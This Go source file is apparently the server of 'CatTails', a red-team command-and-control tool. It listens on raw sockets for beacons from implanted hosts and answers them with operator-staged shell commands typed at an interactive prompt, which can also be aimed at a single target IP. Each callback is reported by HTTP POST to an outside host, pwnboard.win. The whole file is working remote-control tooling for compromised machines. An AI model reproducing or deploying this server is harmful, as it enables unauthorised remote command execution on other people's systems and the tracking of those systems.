package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"

	"github.com/google/gopacket"
	"github.com/oneNutW0nder/CatTails/cattails"
	"golang.org/x/sys/unix"
)

// Global to store staged command
var stagedCmd string

// Glabal to store target info
var targetIP string
var targetcommand string

// Host defines values for a callback from a bot
type Host struct {
	Hostname string
	Mac      net.HardwareAddr
	IP       net.IP
	RespIP   net.IP
	SrcPort  int
	DstPort  int
}

// PwnBoard is used for updating pwnboard
type PwnBoard struct {
	IPs  string `json:"ip"`
	Type string `json:"type"`
}

// sendCommand takes
func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, listen chan Host) {

	// Forever loop to respond to bots
	for {
		// Block on reading from channel
		bot := <-listen
		// Check if there is a command to run
		// Make a socket for sending
		fd := cattails.NewSocket()
		// Create packet
		// fmt.Println("SRC MAC:", iface.HardwareAddr)
		// fmt.Println("DST MAC:", dstMAC)
		// fmt.Println("SRC IP:", myIP)
		// fmt.Println("DST IP:", bot.RespIP)
		if targetIP != "" {
			fmt.Println("[+] Sending target cmd", targetIP, targetcommand)
			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateTargetCommand(targetcommand, targetIP))
			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
		} else {
			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateCommand(stagedCmd))
			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
		}
		// YEET
		if stagedCmd != "" {
			fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
			// Close the socket
			unix.Close(fd)
			go updatepwnBoard(bot)
		} else {
			unix.Close(fd)
			go updatepwnBoard(bot)
		}
	}
}

// ProcessPacket TODO:
func serverProcessPacket(packet gopacket.Packet, listen chan Host) {

	// Get data from packet
	data := string(packet.ApplicationLayer().Payload())
	payload := strings.Split(data, " ")

	// fmt.Println("PACKET SRC IP", packet.NetworkLayer().NetworkFlow().Src().String())

	// Parse the values from the data
	mac, err := net.ParseMAC(payload[2])
	if err != nil {
		fmt.Println("[-] ERROR PARSING MAC:", err)
		return
	}

	srcport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Src().String())
	dstport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Dst().String())

	// New Host struct for shipping info to sendCommand()
	newHost := Host{
		Hostname: payload[1],
		Mac:      mac,
		IP:       net.ParseIP(payload[3]),
		RespIP:   net.ParseIP(packet.NetworkLayer().NetworkFlow().Src().String()),
		SrcPort:  srcport,
		DstPort:  dstport,
	}

	// fmt.Println("[+] Recieved From:", newHost.Hostname, "(", newHost.IP, ")")
	// Write host to channel
	listen <- newHost
}

// Simple CLI to update the "stagedCmd" value
func cli() {
	for {
		// reader type
		reader := bufio.NewReader(os.Stdin)

		fmt.Print("CatTails> ")
		stagedCmd, _ = reader.ReadString('\n')
		// Trim the bullshit newlines
		stagedCmd = strings.Trim(stagedCmd, "\n")
		if stagedCmd == "TARGET" {
			stagedCmd = ""
			// Get the target IP
			fmt.Print("Enter IP to target> ")
			targetIP, _ = reader.ReadString('\n')
			targetIP = strings.Trim(targetIP, "\n")

			// Get TARGET command
			fmt.Print("TARGET COMMAND> ")
			targetcommand, _ = reader.ReadString('\n')
			targetcommand = strings.Trim(targetcommand, "\n")
		}
		fmt.Println("[+] Staged CMD:", stagedCmd)
		if targetcommand != "" {
			fmt.Println("[+] Target CMD:", targetcommand, "on box", targetIP)
		}
	}
}

// Update pwnboard
func updatepwnBoard(bot Host) {
	url := "http://pwnboard.win/generic"

	// Create the struct
	data := PwnBoard{
		IPs:  bot.IP.String(),
		Type: "CatTails",
	}

	// Marshal the data
	sendit, err := json.Marshal(data)
	if err != nil {
		fmt.Println("\n[-] ERROR SENDING POST:", err)
	}

	// Send the post to pwnboard
	_, err = http.Post(url, "application/json", bytes.NewBuffer(sendit))
	if err != nil {
		fmt.Println("[-] ERROR SENDING POST:", err)
	}
}

func main() {

	// Create a BPF vm for filtering
	vm := cattails.CreateBPFVM(cattails.FilterRaw)

	// Create a socket for reading
	readfd := cattails.NewSocket()
	defer unix.Close(readfd)

	fmt.Println("[+] Created sockets")

	// Make channel buffer by 5
	listen := make(chan Host, 5)

	// Iface and myip for the sendcommand func to use
	iface, myIP := cattails.GetOutwardIface("8.8.8.8:80")
	fmt.Println("[+] Interface:", iface.Name)

	dstMAC, err := cattails.GetRouterMAC()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] DST MAC:", dstMAC.String())

	// Spawn routine to listen for responses
	fmt.Println("[+] Starting go routine...")
	go sendCommand(iface, myIP, dstMAC, listen)

	// Start CLI
	go cli()

	// This needs to be on main thread
	for {
		// packet := cattails.ServerReadPacket(readfd, vm)
		packet := cattails.ServerReadPacket(readfd, vm)
		// Yeet over to processing function
		if packet != nil {
			go serverProcessPacket(packet, listen)
		}
	}
}
